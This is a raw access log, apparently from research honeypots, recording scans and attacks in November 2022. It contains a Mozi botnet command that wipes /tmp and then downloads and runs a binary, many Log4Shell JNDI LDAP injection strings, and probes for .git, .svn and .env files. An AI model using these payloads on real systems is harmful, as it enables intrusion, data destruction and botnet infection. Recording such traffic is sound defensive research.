swipe-t-2_running | 20.4.210.27 | 12/Nov/2022:17:26:19 | GET /.svn/ HTTP/1.1 | - | Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36 | y
it-t-2_running | 163.125.213.168 | 14/Nov/2022:13:17:46 | GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1 | - | Hello, world | y
it-t-2_running | 192.241.211.78 | 14/Nov/2022:13:32:43 | MGLNDD_128.8.238.70_80\n | - | - | n
it-t-2_running | 222.117.95.174 | 14/Nov/2022:13:42:14 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
it-t-2_running | 222.117.95.174 | 14/Nov/2022:13:43:36 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
it-t-2_running | 222.117.95.174 | 14/Nov/2022:13:46:18 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
it-t-2_running | 191.242.188.103 | 14/Nov/2022:13:55:26 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
swipe-t-2_running | 194.146.24.107 | 14/Nov/2022:14:07:14 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
blank-t_running | 159.65.242.113 | 14/Nov/2022:14:12:14 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
swipe-t_running | 192.241.211.78 | 14/Nov/2022:13:33:27 | MGLNDD_128.8.238.179_80\n | - | - | n
swipe-t_running | 37.44.238.230 | 14/Nov/2022:13:38:11 | GET / HTTP/1.1 | - | Linux Gnu (cow) | y
swipe-t_running | 92.118.39.78 | 14/Nov/2022:13:45:42 | GET / HTTP/1.1 | - | - | y
swipe-t_running | 194.146.24.107 | 14/Nov/2022:13:45:54 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
swipe-t_running | 93.90.201.200 | 14/Nov/2022:13:58:04 | GET /.git/HEAD HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0 | y
swipe-t-2_running | 120.224.143.251 | 14/Nov/2022:14:17:20 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
swipe-t-2_running | 117.80.212.33 | 14/Nov/2022:14:20:54 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
swipe-t-2_running | 192.155.90.118 | 14/Nov/2022:14:23:06 | \x16\x03\x01 | - | - | n
swipe-t-2_running | 82.64.113.245 | 14/Nov/2022:14:25:21 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
swipe-t-2_running | 89.100.220.211 | 14/Nov/2022:14:31:35 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
swipe-t-2_running | 89.212.123.191 | 14/Nov/2022:14:35:52 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
swipe-t-2_running | 117.80.212.33 | 14/Nov/2022:14:39:53 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
blank-t-2_running | 45.79.181.104 | 14/Nov/2022:14:27:05 | \x16\x03\x01 | - | - | n
blank-t-2_running | 194.146.24.107 | 14/Nov/2022:14:41:24 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
pwd-t_running | 194.146.24.107 | 14/Nov/2022:14:32:18 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
pwd-t_running | 92.118.39.78 | 14/Nov/2022:14:38:45 | GET / HTTP/1.1 | - | - | y
pwd-t_running | 185.48.149.184 | 14/Nov/2022:14:45:47 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 | y
pwd-t_running | 65.154.226.220 | 14/Nov/2022:14:46:48 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36 | y
pwd-t_running | 45.79.181.104 | 14/Nov/2022:14:51:05 | \x16\x03\x01 | - | - | n
it-t_running | 45.79.181.179 | 14/Nov/2022:14:27:19 | \x16\x03\x01 | - | - | n
it-t_running | 37.44.238.205 | 14/Nov/2022:14:39:35 | GET / HTTP/1.1 | - | Linux Gnu (cow) | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:55 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:55 | GET /cdn/bootstrap.css HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:55 | GET /sites/default/themes/bootstrap/css/3.3.5/overrides-cosmo.min726b.css?rg27la HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:55 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/Get-Support-(tree)2.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:55 | GET /sites/default/files/styles/home_news_icons/public/UMDimages/news/newsicons/news-icon6261.png?itok=HIdjWAsb HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:55 | GET /sites/default/files/styles/home_news_icons/public/UMDimages/news/newsicons/Account-Settings2e64.png?itok=3b8i5AIh HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:55 | GET /sites/default/themes/bookstrap_subtheme/css/style726b.css?rg27la HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:55 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/IT-Analytics-(brain)2.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:55 | GET /sites/default/files/styles/home_news_icons/public/UMDimages/news/newsicons/Software-_-Computers177a.png?itok=_mL8_HTO HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:55 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/Secure-Data-(lock)2.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:55 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/Ideas-and-Projects-(lightbulb)2.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:55 | GET /sites/default/files/dit-site-logo.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:55 | GET /sites/divisionofit.umd.edu/files/DITMain_700-x-150.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:55 | GET /sites/divisionofit.umd.edu/files/Terrapin-Tech-3.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:55 | GET /sites/divisionofit.umd.edu/files/Facbook-58x58.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:55 | GET /sites/divisionofit.umd.edu/files/Visotors-3.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:56 | GET /sites/divisionofit.umd.edu/files/Twitter-58x58.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:56 | GET /sites/divisionofit.umd.edu/files/Flicker-58x58.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:55 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/dis-logo.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:56 | GET /sites/divisionofit.umd.edu/files/LinkedIn-58x58.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:56 | GET /sites/divisionofit.umd.edu/files/YouTube-58x58.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 205.169.39.35 | 14/Nov/2022:14:58:56 | GET /sites/divisionofit.umd.edu/files/Instagram-58x58.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t-2_running | 113.125.191.234 | 14/Nov/2022:14:14:05 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
it-t-2_running | 78.83.65.192 | 14/Nov/2022:14:22:45 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 | y
it-t-2_running | 66.175.213.4 | 14/Nov/2022:14:31:56 | \x16\x03\x01 | - | - | n
it-t-2_running | 194.146.24.107 | 14/Nov/2022:14:35:08 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
it-t-2_running | 172.104.242.173 | 14/Nov/2022:14:54:54 | - | - | - | n
swipe-t_running | 64.62.197.20 | 14/Nov/2022:14:28:42 | GET / HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 | y
swipe-t_running | 64.62.197.23 | 14/Nov/2022:14:31:05 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15 | y
swipe-t_running | 172.104.11.51 | 14/Nov/2022:14:42:04 | \x16\x03\x01 | - | - | n
blank-t_running | 43.242.247.139 | 14/Nov/2022:15:31:34 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
swipe-t-2_running | 40.87.11.253 | 14/Nov/2022:14:51:57 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
swipe-t-2_running | 120.224.143.251 | 14/Nov/2022:14:53:45 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
swipe-t-2_running | 82.64.113.245 | 14/Nov/2022:14:53:45 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
swipe-t-2_running | 61.102.42.5 | 14/Nov/2022:14:54:00 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
swipe-t-2_running | 85.51.217.156 | 14/Nov/2022:14:54:31 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
swipe-t-2_running | 93.91.117.60 | 14/Nov/2022:14:54:55 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
swipe-t-2_running | 144.22.130.100 | 14/Nov/2022:14:59:04 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
swipe-t-2_running | 223.99.166.104 | 14/Nov/2022:14:59:29 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
swipe-t-2_running | 195.87.73.176 | 14/Nov/2022:14:59:50 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
swipe-t-2_running | 185.55.64.228 | 14/Nov/2022:15:00:03 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
swipe-t-2_running | 191.242.188.103 | 14/Nov/2022:15:00:39 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
swipe-t-2_running | 195.87.73.208 | 14/Nov/2022:15:01:52 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
swipe-t-2_running | 222.165.136.99 | 14/Nov/2022:15:07:12 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
swipe-t-2_running | 92.118.39.78 | 14/Nov/2022:15:10:08 | GET / HTTP/1.1 | - | - | y
swipe-t-2_running | 182.224.177.33 | 14/Nov/2022:15:10:09 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
swipe-t-2_running | 121.200.53.148 | 14/Nov/2022:15:13:09 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
blank-t-2_running | 61.102.42.5 | 14/Nov/2022:15:12:34 | GET / HTTP/1.1 | ${jndi:ldap://61.102.42.5:8184/a} | ${jndi:ldap://61.102.42.5:8184/a} | y
blank-t-2_running | 178.140.136.178 | 14/Nov/2022:15:15:14 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
blank-t_running | 89.121.228.38 | 14/Nov/2022:15:52:38 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
blank-t_running | 147.182.233.56 | 14/Nov/2022:15:58:57 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
pwd-t_running | 109.206.243.220 | 14/Nov/2022:15:20:31 | GET /explore HTTP/1.1 | - | Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 | y
pwd-t_running | 194.146.24.107 | 14/Nov/2022:15:56:07 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
blank-t_running | 118.41.204.72 | 14/Nov/2022:16:12:24 | GET / HTTP/1.1 | ${jndi:ldap://118.41.204.72:8181/a} | ${jndi:ldap://118.41.204.72:8181/a} | y
it-t-2_running | 113.125.191.234 | 14/Nov/2022:15:27:34 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
it-t-2_running | 194.146.24.107 | 14/Nov/2022:15:47:55 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
swipe-t_running | 109.237.97.180 | 14/Nov/2022:15:35:14 | GET /.env HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36 | y
swipe-t_running | 109.237.97.180 | 14/Nov/2022:15:35:14 | \x16\x03\x01\x01H\x01 | - | - | n
swipe-t_running | 167.94.146.59 | 14/Nov/2022:15:52:42 | GET / HTTP/1.1 | - | - | y
swipe-t_running | 167.94.146.59 | 14/Nov/2022:15:52:42 | GET / HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
swipe-t_running | 167.94.146.59 | 14/Nov/2022:15:52:43 | PRI command-cache.json cron_jobs force_cleanup.sh honeypot_environment nat_rules.sh process_complete_container.sh README.md serve_honeypot.sh start_all_honeypots.sh start_up HTTP/2.0 | - | - | n
swipe-t_running | 167.94.146.59 | 14/Nov/2022:15:52:48 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
it-t_running | 74.82.47.48 | 14/Nov/2022:15:55:55 | GET / HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15 | y
it-t_running | 74.82.47.20 | 14/Nov/2022:16:00:56 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84 | y
blank-t_running | 121.200.53.148 | 14/Nov/2022:16:35:04 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
blank-t_running | 113.125.191.234 | 14/Nov/2022:16:36:48 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
swipe-t-2_running | 121.200.53.148 | 14/Nov/2022:15:54:30 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
swipe-t-2_running | 89.100.220.200 | 14/Nov/2022:15:58:30 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
swipe-t-2_running | 195.87.73.176 | 14/Nov/2022:15:58:32 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
swipe-t-2_running | 102.141.225.238 | 14/Nov/2022:16:00:28 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
swipe-t-2_running | 157.245.137.18 | 14/Nov/2022:16:08:12 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
swipe-t-2_running | 182.224.177.33 | 14/Nov/2022:16:08:41 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
swipe-t-2_running | 95.91.13.119 | 14/Nov/2022:16:09:55 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
swipe-t-2_running | 119.4.109.93 | 14/Nov/2022:16:11:30 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
swipe-t-2_running | 37.44.238.67 | 14/Nov/2022:16:11:42 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
swipe-t-2_running | 69.236.215.6 | 14/Nov/2022:16:12:33 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
swipe-t-2_running | 159.65.242.113 | 14/Nov/2022:16:12:58 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
swipe-t-2_running | 185.55.64.228 | 14/Nov/2022:16:14:19 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
swipe-t-2_running | 89.121.228.38 | 14/Nov/2022:16:15:13 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
swipe-t-2_running | 113.125.191.234 | 14/Nov/2022:16:18:19 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
swipe-t-2_running | 209.216.177.158 | 14/Nov/2022:16:18:36 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
swipe-t-2_running | 70.60.102.117 | 14/Nov/2022:16:23:36 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
swipe-t-2_running | 1.220.98.197 | 14/Nov/2022:16:25:31 | GET / HTTP/1.1 | ${jndi:ldap://1.220.98.197:8187/a} | ${jndi:ldap://1.220.98.197:8187/a} | y
swipe-t-2_running | 194.146.24.107 | 14/Nov/2022:16:30:52 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
blank-t-2_running | 113.125.191.234 | 14/Nov/2022:15:55:50 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
blank-t-2_running | 61.102.42.5 | 14/Nov/2022:16:01:27 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t-2_running | 194.146.24.107 | 14/Nov/2022:16:04:27 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
blank-t-2_running | 89.212.123.191 | 14/Nov/2022:16:05:26 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t-2_running | 194.146.24.107 | 14/Nov/2022:16:26:38 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
blank-t-2_running | 34.76.158.233 | 14/Nov/2022:16:44:54 | GET / HTTP/1.1 | - | python-requests/2.28.1 | y
blank-t_running | 223.223.200.243 | 14/Nov/2022:16:56:10 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
pwd-t_running | 184.67.149.186 | 14/Nov/2022:16:12:24 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
pwd-t_running | 191.242.182.210 | 14/Nov/2022:16:13:13 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
pwd-t_running | 5.28.139.161 | 14/Nov/2022:16:13:22 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
pwd-t_running | 101.35.198.225 | 14/Nov/2022:16:17:03 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
pwd-t_running | 69.236.215.6 | 14/Nov/2022:16:17:34 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
pwd-t_running | 191.242.188.103 | 14/Nov/2022:16:18:22 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
pwd-t_running | 103.105.12.48 | 14/Nov/2022:16:19:39 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
pwd-t_running | 180.93.32.58 | 14/Nov/2022:16:20:29 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
pwd-t_running | 36.112.152.152 | 14/Nov/2022:16:20:36 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
pwd-t_running | 223.99.166.104 | 14/Nov/2022:16:23:54 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
pwd-t_running | 95.91.13.119 | 14/Nov/2022:16:24:24 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
pwd-t_running | 222.134.240.92 | 14/Nov/2022:16:24:31 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
pwd-t_running | 118.41.204.72 | 14/Nov/2022:16:25:06 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
pwd-t_running | 40.87.11.253 | 14/Nov/2022:16:25:16 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
pwd-t_running | 113.125.191.234 | 14/Nov/2022:16:26:14 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
pwd-t_running | 117.80.212.33 | 14/Nov/2022:16:26:57 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
